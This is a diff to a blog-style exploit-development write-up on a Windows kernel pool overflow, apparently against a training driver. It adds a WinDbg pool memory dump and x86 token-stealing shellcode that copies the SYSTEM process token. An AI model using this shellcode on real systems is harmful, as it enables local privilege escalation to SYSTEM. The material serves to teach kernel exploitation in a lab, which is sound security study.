@@ -846,10 +846,39 @@ Access violation - code c0000005 (!!! second chance !!!)
 
 We did it!!
 
+You can examine the pool allocations too. Look at pool allocation right after our kernel buffer. We've replaced `0xc` with `0x0` and you can see how it differs from the next Event Object as I've marked them with asteriks. 
+```
+855b8af8 42 42 42 42 42 42 42 42 40 00 08 04 45 76 65 ee  BBBBBBBB@...Eve.
+855b8b08 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00  ....@...........
+855b8b18 01 00 00 00 01 00 00 00 00 00 00 00 *00* 00 08 00  ................
+855b8b28 80 82 14 85 00 00 00 00 01 00 04 00 00 00 00 00  ................
+855b8b38 38 8b 5b 85 38 8b 5b 85 08 00 08 04 45 76 65 ee  8.[.8.[.....Eve.
+855b8b48 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00  ....@...........
+855b8b58 01 00 00 00 01 00 00 00 00 00 00 00 *0c* 00 08 00  ................
+```
+
 Now let's just allocate some shellcode there...
 
 ## Shellcode Implementation
-We're going to set up some dummy shellcode of interrupts just as a place holder and then set an access breakpoint on `0x60` so that when any process tries to read a byte of data at that address, our breakpoint activates and we can examine the callstack and dissassembly that got us to this point, ie looking inside the `CloseProcedure` routine. 
+We're going to first use our shellcode from our Uninit Stack Variable exploit and see how far that gets us:
+```cpp
+char Shellcode[] = (
+		"\x60"
+		"\x64\xA1\x24\x01\x00\x00"
+		"\x8B\x40\x50"
+		"\x89\xC1"
+		"\x8B\x98\xF8\x00\x00\x00"
+		"\xBA\x04\x00\x00\x00"
+		"\x8B\x80\xB8\x00\x00\x00"
+		"\x2D\xB8\x00\x00\x00"
+		"\x39\x90\xB4\x00\x00\x00"
+		"\x75\xED"
+		"\x8B\x90\xF8\x00\x00\x00"
+		"\x89\x91\xF8\x00\x00\x00"
+		"\x61"
+		"\xC3"
+		);
+```
 
 These are my breakpoints right now:
 ```
@@ -860,17 +889,10 @@ kd> bl
  1 e 00000060 r 1 0001 (0001) 
 ```
 
-Here is the disassembly pane after we hit our access breakpoint a few times (remember that that address will be accessed multiple times during our exploit):
+Here is the disassembly pane after we hit our access breakpoint a few times (remember that that address will be accessed multiple times during our exploit). You can see we're calling a function located at `edi` + `0x60` when `edi` is set to `0`. So, this is our shellcode we're about to run:
 
 ![](/assets/images/AWE/poolover5.PNG)
 
 Here is the call stack: 
 
 ![](/assets/images/AWE/poolover6.PNG)
-
-See if you can figure out from here why we need the return 0x10 at the bottom portion of our shellcode. A good excercise is to set a breakpoint at the beginning of your shellcode, take a screen cap of the registers and their states, then step through the shellcode and see what 
-
-
-
-
-
